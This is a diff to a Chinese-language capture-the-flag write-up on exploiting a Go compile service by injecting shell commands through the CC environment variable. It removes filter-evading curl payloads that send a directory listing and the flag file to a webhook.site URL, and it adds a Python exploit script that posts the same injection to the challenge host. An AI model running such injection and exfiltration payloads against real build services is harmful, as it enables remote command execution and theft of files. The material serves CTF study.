@@ -713,22 +713,47 @@ cgo: cannot parse $WORK/b041/_cgo_.o as ELF, Mach-O, PE or XCOFF
 其實 golang官網有提到CC這個環境變數相關資料
 ![golang-official-cc](img/go_official.png)
 
-## 最終payload
-Env CC
-```
-sh -c "cu${x}rl  https://webhook.site/f32eb628-6ee2-4cc5-85d6-23665880807f -X POST -d $(l${x}s /app|base64)"
-sh -c "cu${x}rl  https://webhook.site/f32eb628-6ee2-4cc5-85d6-23665880807f -X POST -d $(c${x}at /app/flag.mygo|base64|tr -d '\n')"
-```
+## exploit
+```py
+import requests
+import sys
 
-code
-```golang
-package main
+def exploit():
+    if len(sys.argv) != 2:
+        print("Usage: python3 exploit.py <webhook_url>")
+        sys.exit(1)
 
-import "C"
+    YOURhost = sys.argv[1]
 
-func main() {
-    println("Naup")
-}
+    url = "http://cha-thjcc.scint.org:20000/mygolang"
+
+    headers = {
+        "Host": "cha-thjcc.scint.org:20000",
+        "Content-Type": "application/json",
+        "Connection": "keep-alive"
+    }
+
+    data = {
+        "env": {
+            "CC": "sh -c \"cu${x}rl " + YOURhost + " -X POST -d $(c${x}at /app/flag.mygo|base64|tr -d '\\n')\""
+        },
+        "code": 
+    """
+    package main
+    import \"C\"
+
+    func main() {
+        println(\"Naup\")
+    }
+    """
+    }
+
+    response = requests.post(url, headers=headers, json=data)
+
+    print("Status Code:", response.status_code)
+    print("Response Body:", response.text)
+
+exploit()
 ```
 
 
